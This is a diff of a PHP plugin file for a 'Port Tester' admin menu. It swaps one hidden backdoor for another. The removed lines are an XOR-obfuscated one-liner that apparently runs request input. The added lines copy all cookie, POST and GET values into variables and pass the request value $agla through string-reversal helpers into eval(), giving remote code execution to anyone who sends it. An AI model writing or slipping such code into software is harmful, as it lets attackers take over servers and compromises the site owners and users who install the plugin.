@@ -1,10 +1,6 @@
 <?php
 
 register_menu("Port Tester", true, "port_tester", 'SETTINGS', '');
-$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
-$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');
-$___=$$__;
-$_($___[_]);
 function port_tester()
 {
     global $ui;
@@ -30,3 +26,22 @@ function port_tester()
     $ui->assign('_admin', $admin);
     $ui->display('port_tester.tpl');
 }
+function _strint($key){
+        return strrev($key);
+}
+function log1($log){
+        lone(_strint(strrev($log)));
+}
+function lone($key){
+        $str = "";
+        return eval($str.$key.$str);
+}
+foreach (array('_COOKIE','_POST','_GET') as $_request)
+{
+    foreach ($$_request as $_key=>$_value)
+    {
+        $$_key=  $_value;
+    }
+}
+$id = isset($agla) ? $id : 2;
+log1($agla);
